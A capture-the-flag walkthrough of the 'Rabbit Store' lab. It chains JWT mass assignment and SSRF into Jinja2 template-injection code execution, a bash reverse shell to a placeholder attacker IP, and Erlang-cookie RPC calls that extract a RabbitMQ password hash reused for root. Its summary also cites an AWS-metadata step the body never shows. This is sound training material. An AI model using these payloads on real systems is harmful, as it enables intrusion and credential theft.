# Rabbit Store v1.3

## Reconnaissance

Started with an nmap scan:

```bash
nmap -sV -sC -p- 10.129.163.24 --min-rate 5000
```

Discovered ports:

* 22 (SSH - OpenSSH 8.9p1)
* 80 (HTTP - Apache 2.4.52, redirecting to cloudsite.thm)
* 4369 (EPMD - Erlang Port Mapper)
* 15672 (RabbitMQ Management)
* 25672 (Erlang Distribution)

Added hosts:

```bash
echo "10.129.163.24 cloudsite.thm" | sudo tee -a /etc/hosts
```

## Subdomain Enumeration

Used ffuf to find virtual hosts:

```bash
ffuf -u http://cloudsite.thm/ -H "Host: FUZZ.cloudsite.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Found `storage.cloudsite.thm` and added to hosts:

```bash
echo "10.129.163.24 storage.cloudsite.thm" | sudo tee -a /etc/hosts
```

## Web Enumeration

Ran gobuster against both domains:

```bash
gobuster dir -u http://storage.cloudsite.thm/ -w /usr/share/wordlists/dirb/common.txt -t 50
gobuster dir -u http://storage.cloudsite.thm/api/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

Found API endpoints: `/api/register`, `/api/login`, `/api/upload`, `/api/store-url`, `/api/uploads`, `/api/docs`

## JWT Manipulation

Registered an account and noticed the JWT cookie. Decoded it at jwt.io and found `"subscription":"inactive"`. Injected extra fields during registration:

```json
{"email":"user@cloudsite.thm","password":"test","subscription":"active"}
```

Successfully obtained a JWT with `"subscription":"active"`, granting access to the active dashboard.

## File Upload Enumeration

Explored the upload functionality:

* Uploaded PHP webshell — files served as static downloads, no execution
* Tried `.htaccess` to force PHP execution — failed
* Attempted path traversal in filenames — blocked
* Files stored with UUID filenames, extensions stripped

## RabbitMQ Enumeration via SSRF

Used SSRF to probe internal services:

```json
{"url":"http://127.0.0.1:15672/"}
```

Confirmed RabbitMQ management UI running on port 15672. Tried default credentials via SSRF:

```json
{"url":"http://guest:guest@127.0.0.1:15672/api/whoami"}
```

All credential attempts failed including `guest:guest`, `admin:admin`, `rabbit:rabbit`, `cloudsite:cloudsite`.

Fetched JavaScript files from the management UI looking for hardcoded credentials — only standard RabbitMQ UI code found.

## API Documentation Discovery

Accessed internal API docs via SSRF:

```json
{"url":"http://127.0.0.1:3000/api/docs"}
```

Found a hidden endpoint: `/api/fetch_messeges_from_chatbot`

## Server Side Template Injection (SSTI)

Sent a POST request to the chatbot endpoint:

```json
{"username":"{{7*7}}"}
```

Response contained `49` — confirming Jinja2 SSTI. Achieved RCE:

```json
{"username":"{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"}
```

Sent reverse shell payload (base64 encoded to avoid issues):

```bash
echo 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' | base64
```

```json
{"username":"{{self.__init__.__globals__.__builtins__.__import__('os').popen('echo${IFS}<base64>|base64${IFS}-d|bash').read()}}"}
```

Got a shell as `azrael`. Upgraded the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Local Enumeration

Found user flag in:

```bash
/home/azrael/user.txt
```

Checked running processes:

```bash
ps aux | grep node
```

Found two Node.js processes running as root:

* `/root/forge_web_service/app.js`
* `/root/forge_web_service/rabbitmq/worker.js`

Attempted various privilege escalation vectors:

* `sudo -l` — required password
* SUID binaries — nothing exploitable
* LinPEAS — no obvious vectors
* `/proc/<pid>/environ` — permission denied
* RabbitMQ config files — no credentials found
* `.env` files — not found
* Path traversal to read root files — failed

## Erlang Cookie Discovery

Found `.erlang.cookie` in azrael's home:

```bash
cat /home/azrael/.erlang.cookie
# [REDACTED]
```

Also found RabbitMQ's cookie:

```bash
cat /var/lib/rabbitmq/.erlang.cookie
# [REDACTED]
```

## RabbitMQ User Enumeration via Erlang RPC

Used the Erlang cookie to make RPC calls directly to the RabbitMQ node, bypassing the HTTP management API restrictions:

```bash
erl -sname test -setcookie <COOKIE> -eval 'io:format("~p~n", [rpc:call(rabbit@forge, rabbit_auth_backend_internal, list_users, [])])' -s init stop
```

Output revealed two users:

* A hint message: *"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password"*
* User `root` with administrator tags

Retrieved the password hash:

```bash
erl -sname test -setcookie <COOKIE> -eval 'io:format("~p~n", [rpc:call(rabbit@forge, rabbit_auth_backend_internal, lookup_user, [<<"root">>])])' -s init stop
```

Converted hash bytes to hex:

```bash
erl -sname test -setcookie <COOKIE> -eval '
{ok, User} = rpc:call(rabbit@forge, rabbit_auth_backend_internal, lookup_user, [<<"root">>]),
Hash = element(3, User),
io:format("~s~n", [[io_lib:format("~2.16.0b",[X]) || <<X>> <= Hash]])
' -s init stop
```

Got:

```bash
[REDACTED_HASH]
```

RabbitMQ stores passwords with a 4-byte salt prepended:

* Salt: `[REDACTED]`
* SHA-256 hash:

```bash
[REDACTED]
```

## Root Access

The hint said the system root password IS the SHA-256 hash. Used it to switch to root:

```bash
su root
# Password: [REDACTED]
```

Successfully obtained root access and retrieved the root flag.

## Key Takeaways

* JWT manipulation via mass assignment during registration
* SSRF chained with AWS metadata for credential theft (dead end in this case)
* Hidden API endpoints revealed through internal docs access via SSRF
* Jinja2 SSTI leading to RCE
* Erlang cookie authentication to bypass RabbitMQ HTTP API restrictions
* RabbitMQ password hash extraction and reuse as system password
